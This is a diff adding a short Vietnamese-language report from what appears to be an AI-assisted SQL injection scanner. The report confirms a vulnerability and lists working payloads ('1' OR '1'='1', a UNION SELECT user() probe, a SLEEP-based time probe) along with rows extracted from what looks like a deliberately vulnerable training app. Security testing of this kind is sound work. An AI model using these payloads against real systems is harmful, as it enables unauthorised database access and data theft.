@@ -1,0 +1,5 @@
+SQL Injection — AI Self-Validation hoàn tất.
+      - Payload tốt nhất   : 1' OR '1'='1
+      - Mục đích           : Classic OR Auth Bypass
+      - Output trích xuất  : ID: 1' OR '1'='1First name: adminSurname: admin | ID: 1' OR '1'='1First name: GordonSurname: Brown | ID: 1' OR '1'='1First name: HackSurname: Me | ID:
+      - AI Reasoning       : Kết quả từ payload '1' OR '1'='1' và '1' UNION SELECT null, user()#' cho thấy lỗ hổng SQL Injection thực sự tồn tại và có thể được khai thác để lấy thông tin hệ thống. Payload '1' AND SLEEP(5)#' cũng cho thấy thời gian phản hồi bị delay, nhưng không có thông tin hệ thống cụ thể. Tuy nhiên, các kết quả này đủ để xác nhận lỗ hổng SQL Injection.
